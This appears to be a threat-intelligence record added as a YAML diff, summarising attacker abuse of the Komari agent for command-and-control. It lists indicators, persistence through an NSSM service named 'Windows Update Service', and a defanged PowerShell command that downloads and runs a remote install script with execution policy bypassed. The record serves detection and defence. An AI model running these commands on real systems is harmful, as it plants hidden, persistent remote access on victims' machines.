@@ -1,0 +1,60 @@
+title: Komari Agent Installation and C2 Communication
+description: A PowerShell one-liner installed Komari agent from GitHub, establishing
+  a SYSTEM-level service for persistent C2 communication.
+attribution: ''
+malware_families:
+- Komari
+cves: []
+ttps:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - komari-agent.exe
+  - nssm.exe
+  - wininit.exe
+  - services.exe
+  command_lines:
+  - powershell.exe -ExecutionPolicy Bypass -File C:\Users\[User 1]\AppData\Local\Temp\102184ef-a26d-4fb6-4bff-d4e4bd5e8de0.ps1
+  - e http://172.16.57.149:25774 -t DzX7Dkdg3ktERvbLOmbe5e
+  - komari-agent.exe (SYSTEM)
+  - powershell.exe ...\Temp\102184ef-...ps1 (uploadBasicInfo)
+  powershell:
+  - '{[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
+    iwr hxxps://raw.githubusercontent.com/komari-monitor/komari-agent/master/install.ps1
+    -OutFile C:\Users\[User 1]\AppData\Local\Temp\install.ps1; powershell.exe -ExecutionPolicy
+    Bypass -File C:\Users\[User 1]\AppData\Local\Temp\install.ps1}'
+  scripts: []
+  registry_keys:
+  - HKLM\SYSTEM\CurrentControlSet\Services\Windows Update Service
+  - HKLM\System\CurrentControlSet\Services\Windows Update Service\Parameters
+  image_loads: []
+  network_connections:
+  - komari-agent.exe -> raw.githubusercontent.com:443
+  - komari-agent.exe -> ws(s)://<server>/api/clients/report?token=<token>
+  - komari-agent.exe -> 172.16.57.149:25774
+  file_activity:
+  - C:\Users\[User 1]\AppData\Local\Temp\102184ef-a26d-4fb6-4bff-d4e4bd5e8de0.ps1
+  persistence:
+  - NSSM-managed service named Windows Update Service pointing to komari-agent.exe
+  - nssm registered "Windows Update Service" pointing to komari-agent.exe with specific
+    parameters
+  process_relations:
+  - nssm -> komari-agent.exe
+  - wininit.exe -> services.exe (SYSTEM)
+  - services.exe (SYSTEM) -> nssm.exe
+  - nssm.exe -> komari-agent.exe (SYSTEM)
+iocs:
+  hashes: []
+  ip_addresses:
+  - 45.153.34[.]132
+  domains:
+  - raw.githubusercontent.com
+  urls:
+  - hxxps://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff34a7586761e47e1b1704b02748003a4
+  - hxxps://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F74a60237ba9547d58007226342efd8a3
+  - hxxps://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F60215728a8f24e128e3ee367444ff605
+  - hxxps://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F5b188c4efd3b4fdf81266ce5aa4711e7
+authors: []
+reference: https://www.huntress.com/blog/komari-c2-agent-abuse
+date_of_publication: April 16, 2026
+file_creation_date: May 01, 2026
